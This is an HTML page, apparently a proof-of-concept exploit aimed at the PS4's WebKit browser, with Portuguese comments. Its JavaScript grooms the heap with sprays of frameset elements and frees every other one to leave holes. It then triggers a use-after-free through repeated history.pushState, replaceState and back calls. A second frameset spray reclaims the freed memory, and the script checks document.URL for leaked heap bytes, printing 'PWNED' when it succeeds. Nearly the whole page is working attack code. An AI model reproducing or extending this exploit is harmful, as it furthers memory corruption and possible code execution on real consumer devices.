<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Pure FastMalloc Sandwich</title>
<style>
    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #0f0; background: #002200; color: #fff;
        text-transform: uppercase;
    }
    #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
    .success { color: #000; background-color: #0f0; padding: 5px; font-weight: bold;}
</style>
</head>
<body>
<h2>PS4 WebKit - Pure FastMalloc Sandwich</h2>
<div id="status">Estratégia: Tudo via Frameset (FastMalloc)</div>

<button onclick="runFastMallocSandwich()">INICIAR SANDUÍCHE (FRAMESET)</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m, type="") { 
    const d = document.createElement("div");
    if(type) d.className = type;
    d.textContent = m;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var grooming = []; // Spray 1
var attack = [];   // Spray 2

// TÉCNICA PSFREE: GC para limpar
function forceGC() {
    for (let i = 0; i < 2; i++) {
        new Uint8Array(4 * 1024 * 1024);
    }
}

async function runFastMallocSandwich() {
    logEl.innerHTML = "";
    grooming = [];
    attack = [];
    statusEl.innerText = "Preparando...";

    // Alvo: 340.356 bytes
    // Frameset: / 8 = ~42544 vírgulas
    const COMMAS = 42544;
    const VARIATION = 64; // Variação para alinhar headers
    
    // === PASSO 1: PRE-SPRAY (GROOMING COM FRAMESET) ===
    log("1. [SPRAY 1] Grooming com Framesets (FastMalloc)...");
    
    // Criamos ~500 framesets para preencher o heap
    // Usamos tamanhos variados para garantir que criamos buracos de todos os tamanhos possíveis
    for(let i=0; i<500; i++) {
        // Varia o tamanho levemente
        let delta = (i % (VARIATION * 2)) - VARIATION;
        let count = COMMAS + delta;
        
        try {
            let f = document.createElement("frameset");
            f.rows = ",".repeat(count);
            grooming.push({ el: f, count: count });
        } catch(e) {}
    }
    
    log("2. Criando buracos (Swiss Cheese)...");
    // Liberamos objetos alternados para criar espaços
    let holes = 0;
    for(let i=0; i<grooming.length; i+=2) {
        grooming[i].el.rows = ""; // Libera a memória
        grooming[i] = null;
        holes++;
    }
    
    forceGC();
    await sleep(100);
    log(`${holes} buracos preparados.`);

    // === PASSO 2: TRIGGER UAF (INTACTO) ===
    log("3. Disparando UAF Original...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        // MOMENTO DO ATAQUE
        if (i === 47) {
            log(">>> [SPRAY 2] RECLAIM VIA FRAMESET <<<");
            
            // Agenda a liberação
            setTimeout(() => history.back(), 0);
            
            // Spray Síncrono Imediato
            // Tentamos preencher com framesets novamente
            // Como usamos frameset no grooming, o buraco deve ser compatível
            doFramesetAttack(COMMAS);
            
            setTimeout(() => forceGC(), 10);
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    await sleep(300);

    // === PASSO 3: VERIFICAÇÃO ===
    checkResult();
}

function doFramesetAttack(baseCount) {
    // Variação de tamanho para acertar o buraco exato
    for(let delta = -64; delta <= 64; delta += 2) {
        try {
            let count = baseCount + delta;
            let f = document.createElement("frameset");
            f.rows = ",".repeat(count);
            attack.push(f);
        } catch(e) {}
    }
}

function checkResult() {
    statusEl.innerText = "Verificando...";
    let url = document.URL;
    let changed = false;
    let sample = "";
    
    // Se funcionar, a URL não será mais "VVVV".
    // Ela será composta por bytes que representam a estrutura Length do C++
    // Geralmente muitos 00 e alguns 01 ou ponteiros.
    for(let i=1000; i<5000; i++) {
        if(url.charCodeAt(i) !== 0x56) { // 0x56 é 'V'
            changed = true;
            for(let k=0; k<16; k++) {
                sample += url.charCodeAt(i+k).toString(16).padStart(2,'0') + " ";
            }
            break;
        }
    }

    if(changed) {
        log("!!! JACKPOT !!!", "success");
        log("Memória Reclamada por Frameset!");
        log("Dados Binários: " + sample);
        statusEl.innerText = "PWNED: FRAMESET";
    } else {
        log("Falha: Ainda vendo 'V'.");
        log("O buraco pode estar sendo roubado por outro processo interno ou o tamanho do grooming não casou.");
    }
}
</script>
</body>
</html>
